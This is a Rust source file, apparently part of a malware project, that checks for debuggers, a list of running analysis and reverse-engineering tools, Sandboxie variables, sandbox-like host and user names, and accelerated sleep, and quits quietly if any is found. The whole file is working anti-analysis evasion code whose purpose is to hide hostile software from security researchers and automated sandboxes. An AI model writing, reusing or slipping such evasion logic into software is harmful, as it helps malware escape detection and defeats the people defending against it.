use std::time::{Duration, Instant};

#[cfg(target_os = "linux")]
use std::fs;
#[cfg(target_os = "linux")]
use std::path::Path;

#[cfg(target_os = "windows")]
use winapi::shared::minwindef::DWORD;
#[cfg(target_os = "windows")]
use winapi::um::debugapi::IsDebuggerPresent;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::SetErrorMode;
#[cfg(target_os = "windows")]
use winapi::um::handleapi::CloseHandle;
#[cfg(target_os = "windows")]
use winapi::um::sysinfoapi::GlobalMemoryStatusEx;
#[cfg(target_os = "windows")]
use winapi::um::sysinfoapi::MEMORYSTATUSEX;
#[cfg(target_os = "windows")]
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
#[cfg(target_os = "windows")]
use winapi::um::fileapi::GetDiskFreeSpaceExA;
#[cfg(target_os = "windows")]
use winapi::shared::ntdef::ULARGE_INTEGER;

pub fn exit_if_sandboxed() {
    if check_all() {
        #[cfg(target_os = "windows")]
        unsafe {
            SetErrorMode(0);
        }
        std::process::exit(0);
    }
}

fn check_all() -> bool {
    check_debugger()
        || check_analysis_processes()
        || check_sandbox_env_vars()
        || check_sleep_acceleration()
}

fn check_debugger() -> bool {
    #[cfg(target_os = "linux")]
    {
        if let Ok(status) = fs::read_to_string("/proc/self/status") {
            for line in status.lines() {
                if line.starts_with("TracerPid:") {
                    let pid = line.trim_start_matches("TracerPid:").trim();
                    if pid != "0" {
                        return true;
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        unsafe {
            if IsDebuggerPresent() != 0 {
                return true;
            }
        }
    }

    false
}

#[cfg(target_os = "linux")]
const ANALYSIS_PROCESSES: &[&str] = &[
    "wireshark",
    "tcpdump",
    "strace",
    "ltrace",
    "gdb",
    "procmon",
    "procexp",
    "ftk",
    "foremost",
    "volatility",
    "radare2",
    "rizin",
];

#[cfg(target_os = "windows")]
const ANALYSIS_PROC_W: &[&str] = &[
    "wireshark.exe",
    "procmon.exe",
    "procmon64.exe",
    "procexp.exe",
    "procexp64.exe",
    "tcpview.exe",
    "fiddler.exe",
    "processhacker.exe",
    "processhacker64.exe",
    "ida.exe",
    "ida64.exe",
    "x64dbg.exe",
    "x32dbg.exe",
    "ollydbg.exe",
    "immunitydebugger.exe",
    "windbg.exe",
    "regmon.exe",
    "filemon.exe",
    "apimonitor.exe",
    "apiMonitor.exe",
    "dumpcap.exe",
    "python.exe",
    "python3.exe",
    "pestry.exe",
    "peid.exe",
    "lordpe.exe",
    "importrec.exe",
    "petools.exe",
    "dnspy.exe",
    "ilspy.exe",
    "httpanalyzer.exe",
    "fakenet.exe",
    "inetsim.exe",
];

fn check_analysis_processes() -> bool {
    #[cfg(target_os = "linux")]
    {
        if let Ok(entries) = fs::read_dir("/proc") {
            for entry in entries.flatten() {
                let pid = match entry.file_name().to_string_lossy().parse::<u32>() {
                    Ok(n) => n,
                    Err(_) => continue,
                };
                let comm_path = Path::new("/proc").join(pid.to_string()).join("comm");
                if let Ok(name) = fs::read_to_string(&comm_path) {
                    let name = name.trim().to_lowercase();
                    if ANALYSIS_PROCESSES.iter().any(|p| name.contains(p)) {
                        return true;
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
                return false;
            }
            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as DWORD;
            if Process32FirstW(snapshot, &mut entry) != 0 {
                loop {
                    let name = String::from_utf16_lossy(&entry.szExeFile)
                        .trim()
                        .to_lowercase();
                    if ANALYSIS_PROC_W.iter().any(|p| name == *p) {
                        CloseHandle(snapshot);
                        return true;
                    }
                    if Process32NextW(snapshot, &mut entry) == 0 {
                        break;
                    }
                }
            }
            CloseHandle(snapshot);
        }
    }

    false
}

fn check_low_resources() -> bool {
    if let Ok(cores) = std::thread::available_parallelism() {
        if cores.get() <= 2 {
            return true;
        }
    }

    #[cfg(target_os = "linux")]
    {
        if let Ok(meminfo) = fs::read_to_string("/proc/meminfo") {
            for line in meminfo.lines() {
                if line.starts_with("MemTotal:") {
                    let kb_str = line
                        .trim_start_matches("MemTotal:")
                        .trim()
                        .trim_end_matches(" kB");
                    if let Ok(kb) = kb_str.parse::<u64>() {
                        let gb = kb / 1024 / 1024;
                        if gb < 2 {
                            return true;
                        }
                    }
                    break;
                }
            }
        }

        let cpath = std::ffi::CString::new("/").unwrap_or_default();
        let mut stat: libc::statvfs = unsafe { std::mem::zeroed() };
        let ret = unsafe { libc::statvfs(cpath.as_ptr(), &mut stat) };
        if ret == 0 {
            let total_gb = (stat.f_frsize as u64 * stat.f_blocks as u64) / 1024 / 1024 / 1024;
            if total_gb < 60 {
                return true;
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        unsafe {
            let mut mem: MEMORYSTATUSEX = std::mem::zeroed();
            mem.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as DWORD;
            if GlobalMemoryStatusEx(&mut mem) != 0 {
                let total_gb = mem.ullTotalPhys / 1024 / 1024 / 1024;
                if total_gb < 2 {
                    return true;
                }
            }

            let mut free_bytes: ULARGE_INTEGER = std::mem::zeroed();
            let mut total_bytes: ULARGE_INTEGER = std::mem::zeroed();
            let mut total_free_bytes: ULARGE_INTEGER = std::mem::zeroed();
            let drive = "C:\\\0".as_ptr() as *const i8;
            if GetDiskFreeSpaceExA(
                drive,
                &mut free_bytes,
                &mut total_bytes,
                &mut total_free_bytes,
            ) != 0
            {
                let total = total_bytes.QuadPart();
                let total_gb = total / 1024 / 1024 / 1024;
                if total_gb < 60 {
                    return true;
                }
            }
        }
    }

    false
}

fn check_sandbox_env_vars() -> bool {
    for var in &[
        "SBIE",
    ] {
        for (key, _) in std::env::vars() {
            let key = key.to_uppercase();
            if key.starts_with(var) {
                return true;
            }
        }
    }

    if let Ok(compname) = std::env::var("COMPUTERNAME") {
        let lower = compname.to_lowercase();
        if lower.starts_with("sandbox") || lower.starts_with("malware") || lower.starts_with("virus") {
            return true;
        }
    }

    if let Ok(user) = std::env::var("USER") {
        let lower = user.to_lowercase();
        if lower == "sandbox" || lower == "malware" || lower == "virus" || lower == "currentuser" {
            return true;
        }
    }

    let hostname = gethostname::gethostname()
        .into_string()
        .unwrap_or_default()
        .to_lowercase();
    if hostname.starts_with("sandbox")
        || hostname.starts_with("malware")
        || hostname == "win-k9rjhohk3p6"
    {
        return true;
    }

    false
}

fn check_sleep_acceleration() -> bool {
    const TEST_SLEEP_MS: u64 = 2000;
    const TOLERANCE_RATIO: f64 = 0.5;

    let start = Instant::now();
    std::thread::sleep(Duration::from_millis(TEST_SLEEP_MS));
    let elapsed = start.elapsed();

    let ratio = elapsed.as_millis() as f64 / TEST_SLEEP_MS as f64;
    ratio < TOLERANCE_RATIO
}
